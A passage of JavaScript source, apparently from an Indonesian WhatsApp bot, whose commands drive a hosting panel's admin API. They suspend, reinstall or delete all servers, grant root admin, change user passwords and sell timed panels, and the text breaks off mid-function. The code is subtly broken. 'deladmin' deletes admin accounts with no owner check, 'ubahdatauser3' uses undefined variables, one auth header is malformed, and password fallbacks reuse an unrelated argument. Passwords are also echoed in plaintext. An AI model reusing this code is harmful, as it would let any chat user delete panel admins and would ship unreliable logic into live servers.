case 'antiadminilegal': {
if (!isOwner) return reply('⚠️ Perintah ini hanya bisa digunakan oleh Owner.');
if (args[0] === 'on') {
if (monitoringAntiAdminIlegal) {
return reply('⚠️ Antiadmin-ilegal sudah diaktifkan.');
}
reply('✅ Antiadmin-ilegal diaktifkan. Memeriksa dan menghapus admin ilegal...');
monitoringAntiAdminIlegal = true;
await deleteIllegalAdmins();
setInterval(async () => {
if (monitoringAntiAdminIlegal) {
console.log('🔍 Memeriksa akun admin ilegal...');
await deleteIllegalAdmins();
}
}, 60 * 1000);
} else if (args[0] === 'off') {
monitoringAntiAdminIlegal = false;
reply('⚠️ Antiadmin-ilegal telah dimatikan.');
} else {
reply('⚠️ Penggunaan tidak valid. Gunakan `antiadminilegal on` atau `antiadminilegal off`.');
}
break;
}
break

case 'cekakunpanel': {
try {
if (!args[0]) {
return reply(`🚩 *Masukkan ID User Yang Ingin Di Cek*\n\n• Contoh : ${p_c} 5`);
}
const response = await fetch(global.domain + "/api/application/users/" + args[0], {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`,
}
});
const data = await response.json();
if (response.ok) {
const userData = data.attributes;
const accountInfo = `彡  *A C C O U N T - I N F O*\n\n` +
`• User ID: ${userData.id}\n` +
`• Uuid: ${userData.uuid}\n` +
`• A2F: ${userData['2fa'] ? "Enable" : "Disable"}\n` +
`• Is Admin: ${userData.root_admin ? "Yes" : "No"}\n` +
`• Username: ${userData.username}\n` +
`• Email: ${userData.email}\n` +
`• First Name: ${userData.first_name}\n` +
`• Last Name: ${userData.last_name}\n` +
`• Language: ${userData.language}\n` +
`• Create At: ${userData.created_at}\n` +
`• Update At: ${userData.updated_at}`;
return reply(accountInfo);
} else {
return reply(`⚠️ Terjadi kesalahan: ${JSON.stringify(data)}`);
}
} catch (e) {
console.error(e);
return reply('⚠️ Terjadi kesalahan dalam menjalankan permintaan Anda.');
}
break;
}
break

case 'susallsrv': {
if (!isOwner) return reply('❌ Perintah ini hanya bisa digunakan oleh Owner.');
try {
reply('⏳ *Memulai proses suspend semua server...*');
const response = await fetch(`${global.domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
const data = await response.json();
if (!response.ok) {
return reply(`❌ *Terjadi kesalahan saat mengambil daftar server*: ${JSON.stringify(data)}`);
}
const servers = data.data;
if (servers.length === 0) {
return reply('⚠️ *Tidak ada server yang ditemukan untuk disuspend.*');
}
for (const server of servers) {
const serverInfo = server.attributes;
const suspendResponse = await fetch(`${global.domain}/api/application/servers/${serverInfo.id}/suspend`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
if (!suspendResponse.ok) {
const res = await suspendResponse.json();
reply(`❌ *Gagal menyuspend server ID ${serverInfo.id}:* ${res.errors[0]?.detail || 'Error tidak diketahui'}`);
} else {
reply(`✅ *Berhasil menyuspend server ID ${serverInfo.id}*`);
}
}
await reply('✅ *Proses suspend semua server selesai.*');
} catch (e) {
console.error(e);
return reply(`🚩 *Terjadi Kesalahan*: ${JSON.stringify(e)}`);
}
break;
}
break

case 'reinstallallsrv': 
case 'reinstallsrv': {
if (!isOwner) return reply('❌ Perintah ini hanya bisa digunakan oleh Owner.');
try {
reply('⏳ *Memulai proses reinstall semua server...*');
const response = await fetch(`${global.domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
const data = await response.json();
if (!response.ok) {
return reply(`❌ *Terjadi kesalahan saat mengambil daftar server*: ${JSON.stringify(data)}`);
}
const servers = data.data;
if (servers.length === 0) {
return reply('⚠️ *Tidak ada server yang ditemukan untuk di-reinstall.*');
}
for (const server of servers) {
const serverInfo = server.attributes;
const reinstallResponse = await fetch(`${global.domain}/api/application/servers/${serverInfo.id}/reinstall`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});
if (!reinstallResponse.ok) {
const res = await reinstallResponse.json();
reply(`❌ *Gagal reinstall server ID ${serverInfo.id}:* ${res.errors[0]?.detail || 'Error tidak diketahui'}`);
} else {
reply(`✅ *Berhasil reinstall server ID ${serverInfo.id}*`);
}
}
await reply('✅ *Proses reinstall semua server selesai.*');
} catch (e) {
console.error(e);
return reply(`🚩 *Terjadi Kesalahan*: ${JSON.stringify(e)}`);
}
break;
}
break

case 'detailsrv': {
if (!isOwner) return reply('❌ Perintah ini hanya bisa digunakan oleh Owner.');
try {
let srvId = args[0];
if (!srvId) return reply('🚩 *Masukkan ID Server. Contoh penggunaan: detailsrv 5*');
const response = await fetch(`${global.domain}/api/application/servers/${srvId}`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`,
}
});
if (!response.ok) {
const errorData = await response.json();
return reply(`🚩 *Gagal Mendapatkan Detail Server*: ${errorData.errors[0]?.detail || 'Kesalahan tidak diketahui'}`);
}
const serverDetails = await response.json();
const serverInfo = serverDetails.attributes;
const responseText = `🖥️ *Detail Server ID ${serverInfo.id}*
🆔 *External ID:* ${serverInfo.external_id || 'Tidak Ada'}
🔗 *UUID:* ${serverInfo.uuid}
🏷️ *Name:* ${serverInfo.name}
📝 *Description:* ${serverInfo.description || 'Tidak Ada'}
🔒 *Suspended:* ${serverInfo.suspended ? 'Yes' : 'No'}
🔢 *Memory Limit:* ${serverInfo.limits.memory || 'Tidak Ada'} MB
🔄 *Swap Limit:* ${serverInfo.limits.swap || 'Tidak Ada'} MB
💽 *Disk Limit:* ${serverInfo.limits.disk || 'Tidak Ada'} MB
🔄 *IO Limit:* ${serverInfo.limits.io || 'Tidak Ada'} MB/s
🔄 *CPU Limit:* ${serverInfo.limits.cpu || 'Tidak Ada'}%
🗄️ *Databases Limit:* ${serverInfo.feature_limits.databases || 'Tidak Ada'}
🗂️ *Allocations Limit:* ${serverInfo.feature_limits.allocations || 'Tidak Ada'}
📦 *Backups Limit:* ${serverInfo.feature_limits.backups || 'Tidak Ada'}
👤 *User ID:* ${serverInfo.user}
🌐 *Node ID:* ${serverInfo.node}
🆔 *Allocation ID:* ${serverInfo.allocation}
🍃 *Nest ID:* ${serverInfo.nest}
🥚 *Egg ID:* ${serverInfo.egg}
🔄 *Updated At:* ${serverInfo.updated_at || 'Tidak Ada'}
🕰️ *Created At:* ${serverInfo.created_at || 'Tidak Ada'}`;
reply(responseText);
} catch (e) {
console.error(e);
return reply(`🚩 *Terjadi Kesalahan*: ${JSON.stringify(e)}`);
}
break;
}
break

case 'delallsrv': {
if (!isOwner) return reply('❌ Perintah ini hanya bisa digunakan oleh Owner.');
try {
const listResponse = await fetch(`${global.domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`,
}
});
const listData = await listResponse.json();
if (!listResponse.ok) {
return reply(`🚩 Terjadi kesalahan: ${JSON.stringify(listData)}`);
}
const totalServers = listData.meta.pagination.total;
const servers = listData.data;
if (totalServers === 0) {
return reply('✅ Tidak ada server yang dapat dihapus.');
}
for (const server of servers) {
const serverInfo = server.attributes;
const serverId = serverInfo.id;
const deleteResponse = await fetch(`${global.domain}/api/application/servers/${serverId}`, {
method: "DELETE",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer" + apikey,
}
});
const deleteData = deleteResponse.ok ? { errors: null } : await deleteResponse.json();
if (deleteData.errors) {
reply(`🚩 Gagal menghapus Server ID ${serverId}: ${JSON.stringify(deleteData.errors)}`);
} else {
reply(`✅ Berhasil menghapus Server ID ${serverId}`);
}
}
return reply('🚩 *Semua server telah berhasil dihapus.*');
} catch (e) {
console.error(e);
return reply('🚩 Terjadi kesalahan dalam menjalankan permintaan Anda.');
}
break;
}
break

case 'createalllocation': {
try {
if (!args[0] || !args[1] || !args[2]) {
return reply(`🚩 *Masukkan id ip ports,ports2,...*\n\n• Example : .createalllocation 1 0.0.0.0 2773,4762,3664`);
}
const id = args[0];
const ip = args[1];
const ports = args[2].split(',').map(port => port.trim());
const response = await fetch(`${global.domain}/api/application/nodes/${id}/allocations`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
body: JSON.stringify({
"ip": ip,
"ports": ports
})
});
let data;
try {
data = await response.json();
} catch (jsonError) {
throw new Error("Failed to parse JSON response: " + jsonError.message);
}
if (response.ok) {
const allocationInfo = data.attributes || {};
const allocationDetail = `
✅ *Allocation Created Successfully!*

📌 *Node ID:* ${id}
🌐 *IP:* ${allocationInfo.ip || ip}
🔌 *Ports:* ${allocationInfo.ports ? allocationInfo.ports.join(', ') : ports.join(', ')}
`;
reply(allocationDetail);
} else {
return reply(`❌ *Error Occurred:* ${JSON.stringify(data)}`);
}
} catch (e) {
console.error(e);
return reply(`❌ *Terjadi kesalahan:* ${e.message}`);
}
}
break

case 'jadiadp': {
if (!isOwner) return reply('Khusus Owner') 
if (!args[0]) return reply(`Untuk Melihat ID User, silahkan ketik ${prefix}listuser`);
let iduser = args[0];
let getuser = null;
let userEmail = null;
try {      
let response = await fetch(`${global.domain}/api/application/users/${iduser}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`
}
});
if (!response.ok) {
return reply("User Tidak Dapat Ditemukan!");
}
let user = await response.json();
getuser = user.attributes.username;
userEmail = user.attributes.email;      
let updateResponse = await fetch(`${global.domain}/api/application/users/${iduser}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`
},
"body": JSON.stringify({
"email": userEmail, 
"username": getuser, 
"first_name": user.attributes.first_name,
"last_name": user.attributes.last_name,
"language": user.attributes.language,
"root_admin": true 
})
});
if (updateResponse.ok) {
reply(`Berhasil Memberikan Akses Adp Kepada 
👤 *User*: ${getuser}
📆 *Tanggal*: ${penghitung}
🕰 *Waktu*: ${jam}`);
} else {
let errorData = await updateResponse.json();
reply(`Gagal Memberikan Akses Adp. Error: ${errorData.errors[0].detail}`);
}
} catch (error) {
console.error("Error:", error);
reply("Terjadi Kesalahan, Silakan Coba Lagi");
}
}
break

case 'bukanadp': {
if (!isOwner) return reply('Khusus Owner') 
if (!args[0]) return reply(`Untuk Melihat ID User, silahkan ketik ${prefix}listuser`);
let iduser = args[0];
let getuser = null;
let userEmail = null;
try {
let response = await fetch(`${global.domain}/api/application/users/${iduser}`, {
method: "GET",
headers: {
Accept: "application/json",
"Content-Type": "application/json",
Authorization: `Bearer ${apikey}`
}
});
if (!response.ok) {
return reply("User Tidak Dapat Ditemukan!");
}
let user = await response.json();
getuser = user.attributes.username;
userEmail = user.attributes.email; 
let updateResponse = await fetch(`${global.domain}/api/application/users/${iduser}`, {
method: "PATCH",
headers: {
Accept: "application/json",
"Content-Type": "application/json",
Authorization: `Bearer ${apikey}`
},
body: JSON.stringify({
email: userEmail,
username: getuser,
first_name: user.attributes.first_name,
last_name: user.attributes.last_name,
language: user.attributes.language,
root_admin: false 
})
});
if (updateResponse.ok) {
reply(`Berhasil Menghapus Akses Adp Dari 
👤 *User*: ${getuser}
📆 *Tanggal*: ${penghitung}
🕰 *Waktu*: ${jam}`);
} else {
let errorData = await updateResponse.json();
reply(`Gagal Menghapus Akses Admin Panel. Error: ${errorData.errors[0].detail}`);
}
} catch (error) {
console.error("Error:", error);
reply("Terjadi Kesalahan, Silakan Coba Lagi");
}
}
break

case 'ubahserver': {
if (!isOwner) return onlyOr();
let t = text.split(',');
if (t.length < 4) return reply(`Contoh: ${prefix+command} ServerID,Ram,Cpu,Disk`);
let serverID = t[0]; 
let ram = t[1]; 
let cpu = t[2]; 
let disk = t[3];
let serverCheck = await fetch(`${global.domain}` + `/api/application/servers/${serverID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let serverData = await serverCheck.json();
if (serverData.errors) return reply(`Server dengan ID ${serverID} tidak ditemukan.`);
let allocation = serverData.attributes.allocation; 
let updateServer = await fetch(`${global.domain}` + `/api/application/servers/${serverID}/build`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"limits": {
"memory": ram,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"allocation": allocation,
"feature_limits": {
"databases": serverData.attributes.feature_limits.databases,
"allocations": serverData.attributes.feature_limits.allocations,
"backups": serverData.attributes.feature_limits.backups
}
})
});
let updateResponse = await updateServer.json();
if (updateResponse.errors) return reply(JSON.stringify(updateResponse.errors[0], null, 2));
reply(`Server berhasil diperbarui:\n\n🆔 *Server ID*: ${serverID}\n📮 *Ram*: ${ram} MB\n💿 *Disk*: ${disk} MB\n💾 *Cpu*: ${cpu}%\n📧 *Status*: *Berhasil✅*`);
}
break

case 'ubahdatauser1': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 5) return m.reply(`Contoh: ${prefix+command} Iduser,FirstName,LastName,Username,Email`);
let userID = t[0];       
let firstName = t[1];      
let lastName = t[2];
let newUsername = t[3];    
let newEmail = t[4];       
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": newEmail,         
"username": newUsername,   
"first_name": firstName,   
"last_name": lastName     
})
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Data pengguna berhasil diperbarui:\n\n🆔 *User ID*: ${userID}\n👤 *Nama Depan*: ${firstName}\n👤 *Nama Belakang*: ${lastName}\n📧 *Email Baru*: ${newEmail}\n🔑 *Username Baru*: ${newUsername}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahdatausr3':
case 'ubahdatauser3': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 3) return m.reply(`Contoh: ${prefix+command} Iduser,FistName,LastName`);
let userID = t[0];       
let firstName = t[1];      
let lastName = t[2];
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": newEmail,         
"username": newUsername,   
"first_name": firstName,   
"last_name": lastName     
})
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Data pengguna berhasil diperbarui:\n\n🆔 *User ID*: ${userID}\n👤 *Nama Depan*: ${firstName}\n👤 *Nama Belakang*: ${lastName}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahdatauser2':
case 'ubahdatausr2': {
if (!isOwner) return onlyOwn(); 
let t = text.split(',');
if (t.length < 6) return m.reply(`Contoh: ${prefix+command} Iduser,FisrtName,LastName,Username,Email,Password`);
let userID = t[0];
let firstName = t[1];
let lastName = t[2];        
let newUsername = t[3];     
let newEmail = t[4];        
let newPassword = t[5];   
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": newEmail,         
"username": newUsername,  
"first_name": firstName,   
"last_name": lastName,
"password": newPassword
})
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Data pengguna berhasil diperbarui:\n\n🆔 *User ID*: ${userID}\n👤 *Nama Depan*: ${firstName}\n👤 *Nama Belakang*: ${lastName}\n📧 *Email Baru*: ${newEmail}\n🔑 *Username Baru*: ${newUsername}\n🔒 *Password Baru*: ${newPassword}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahemail': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} Iduser,EmailBaru`);
let userID = t[0];
let newEmail = t[1];
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({ "email": newEmail })
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Email Berhasil Diubah:\n\n🆔 *User ID*: ${userID}\n📧 *Email Baru*: ${newEmail}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahpassword': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 2) return m.reply(`Contoh: ${prefix + command} Iduser,PasswordBaru`);
let userID = t[0];
let newPassword = t[1];
let userCheck = await fetch(`${global.domain}/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let userEmail = userData.attributes.email;
let userName = userData.attributes.username;
let firstName = userData.attributes.first_name;
let lastName = userData.attributes.last_name;
if (!userEmail || !userName || !firstName || !lastName) {
return m.reply(`Data pengguna tidak lengkap untuk pengguna dengan ID ${userID}.`);
}
let updateUser = await fetch(`${global.domain}/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"password": newPassword,
"email": userEmail,
"username": userName,
"first_name": firstName,
"last_name": lastName
})
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Password Berhasil Diubah:\n\n🆔 *User ID*: ${userID}\n🔒 *Password Baru*: ${newPassword}\n📧 *Status*: *Berhasil ☑️*`);
}
break

case 'ubahusername': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} Iduser,UsernameBaru`);
let userID = t[0];
let newUsername = t[1];
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({ "username": newUsername })
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Username pengguna berhasil diperbarui:\n\n🆔 *User ID*: ${userID}\n👤 *Username Baru*: ${newUsername}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahfirstname': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} Iduser,NamaDepanBaru`);
let userID = t[0];
let firstName = t[1];
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({ "first_name": firstName })
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Nama Depan Berhasil Diubah:\n\n🆔 *User ID*: ${userID}\n👤 *Nama Depan Baru*: ${firstName}\n📧 *Status*: *Berhasil☑️*`);
}
break

case 'ubahlastname': {
if (!isOwner) return onlyOwn();
let t = text.split(',');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} Iduser,NamaBelakangBaru`);
let userID = t[0];
let lastName = t[1];
let userCheck = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Authorization": "Bearer " + apikey
}
});
let userData = await userCheck.json();
if (userData.errors) return m.reply(`User dengan ID ${userID} tidak ditemukan.`);
let updateUser = await fetch(`${global.domain}` + `/api/application/users/${userID}`, {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({ "last_name": lastName })
});
let updateResponse = await updateUser.json();
if (updateResponse.errors) return m.reply(JSON.stringify(updateResponse.errors[0], null, 2));
m.reply(`Nama Akhir Berhasil Diubah:\n\n🆔 *User ID*: ${userID}\n👤 *Nama Akhir Baru*: ${lastName}\n📧 *Status*: *Berhasil ☑️*`);
};
break

case 'deladmin': {
if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`)
let cek = await fetch(`${global.domain}` + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(`${global.domain}` + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID admin tidak ditemukan!")
m.reply(`Berhasil del admin panel *${getid}*`)
}
break

case 'listadmin': {
if (!isOwner) return onlyOwn();
let page = args[0] ? args[0] : '1';
let f = await fetch(`${global.domain}` + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "A L L - A D M I N D\n\n";   
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `\`\`\`ID:\`\`\` ${u.id}\n`;
messageText += `\`\`\`Username:\`\`\` ${u.username}\n`;
messageText += `\`\`\`Email:\`\`\` ${u.email}\n`;
messageText += `\`\`\`First Name:\`\`\` ${u.first_name}\n`;
messageText += `\`\`\`Last Name:\`\`\` ${u.last_name}\n`;
messageText += `\`\`\`Language:\`\`\` ${u.language}\n`;
messageText += `\`\`\`Root Admin:\`\`\` ${u.root_admin ? 'Yes' : 'No'}\n`;
messageText += `\`\`\`2FA:\`\`\` ${u["2fa"] ? 'Enabled' : 'Disabled'}\n`;
messageText += `\`\`\`Created At:\`\`\`${u.created_at}\n\n`;
}
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await Line.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Contoh: ${prefix + command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'cpanel': {
 if (!isOwner && !isReseller) return onlyOr();

 let t = text.split('-');
 let pilihanUkuran = ['1gb', '2gb', '3gb', '4gb', '5gb', '6gb', '7gb', '8gb', '9gb', '10gb', 'unli'];

 if (t.length < 3) {
  let pilihan = pilihanUkuran.map((ukuran, i) => `• ${i + 1}. ${ukuran}`).join('\n');
  return m.reply(`Silakan pilih ukuran disk:\n\n${pilihan}\n\nContoh: ${prefix+command} 1gb-username-nomer-30d`);
 }

 let ukuran = t[0]
 if (!pilihanUkuran.includes(ukuran)) {
  return m.reply(`Ukuran tidak valid! Pilih salah satu dari: ${pilihanUkuran.join(', ')}`);
 }

 let username = t[1];
 let u = m.quoted ? m.quoted.sender : t[2] ? t[2].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
 let duration = t[3] ? parseInt(t[3].replace('d', '')) : 30;
 let name = username;

 if (!duration || isNaN(duration)) return m.reply("Durasi tidak valid! Contoh: 30d");

 let memo = "1024";
 let disk = "1024";
 let cpu = "30";

 switch (ukuran) {
  case '1gb':
memo = "1024";
disk = "1024";
cpu = "30";
break;
  case '2gb':
memo = "2048";
disk = "2048";
cpu = "50";
break;
  case '3gb':
memo = "3072";
disk = "3072";
cpu = "60";
break;
  case '4gb':
memo = "4096";
disk = "4096";
cpu = "80";
break;
  case '5gb':
memo = "5120";
disk = "5120";
cpu = "90";
break;
  case '6gb':
memo = "6144";
disk = "6144";
cpu = "100";
break;
  case '7gb':
memo = "7168";
disk = "7168";
cpu = "120";
break;
  case '8gb':
memo = "8192";
disk = "8192";
cpu = "140";
break;
  case '9gb':
memo = "9216";
disk = "9216";
cpu = "150";
break;
  case '10gb':
memo = "10240";
disk = "10240";
cpu = "190";
break;
  case 'unli':
memo = "0";
disk = "0";
cpu = "0";
break;
  default:
return m.reply(`Ukuran tidak valid! Pilih salah satu dari: ${pilihanUkuran.join(', ')}`);
 }

 let email = username + "@gmail.com";

 if (!u) return;
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {};
let password = d.exists ? randomKarakter(5) : t[3];
let deskripsi = `${penghitung}`;

let f = await fetch(`${global.domain}` + "/api/application/users", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: username,
first_name: username,
last_name: username,
language: "en",
password: password.toString()
})
});

let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes;

let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});

m.reply(`_Sedang Membuat Server..._`);
let ctf = `*BERIKUT DATA PANEL ANDA*\n\n • Username: ${user.username}\n • Password: ${password.toString()}\n • Server: ${ownername}\n\nSimpan data panelmu baik-baik`;

await Line.sendMessage(u, { text: ctf }, { quoted: m });

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup;

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
  },
body: JSON.stringify({
name: name,
description: deskripsi,
user: user.id,
egg: parseInt(egg),
docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
startup: startup_cmd,
environment: {
INST: "npm",
USER_UPLOAD: "0",
AUTO_UPDATE: "0",
CMD_RUN: "npm start"
},
limits: {
memory: memo === "Unlimited" ? 0 : memo,
swap: 0,
disk: disk === "Unlimited" ? 0 : disk,
io: 500,
cpu: cpu
},
feature_limits: {
databases: 0,
backups: 0,
allocations: 0
},
deploy: {
locations: [parseInt(locc)],
dedicated_ip: false,
port_range: []
}
})
});

let res = await f3.json();
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
let server = res.attributes;

let p = await m.reply(`*SUKSES CPANEL*\n\n ID User : ${user.id}\n ID Server : ${server.id}\n Ram ${memo}\n Disk ${disk}\n Cpu ${cpu}%\n\n Username dan password telah dikirim ke nomer target`);

setTimeout(async () => {
let deleteServer = await fetch(`${global.domain}/api/application/servers/${server.id}`, {
method: 'DELETE',
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});

if (deleteServer.ok) {
console.log(`Server otomatis dihapus setelah ${duration} hari.`);
} else {
console.log("Gagal menghapus server otomatis.");
}
}, duration * 24 * 60 * 60 * 1000);
}
break;

case '1gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1150"
let cpu = "30"
let disk = "1150"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
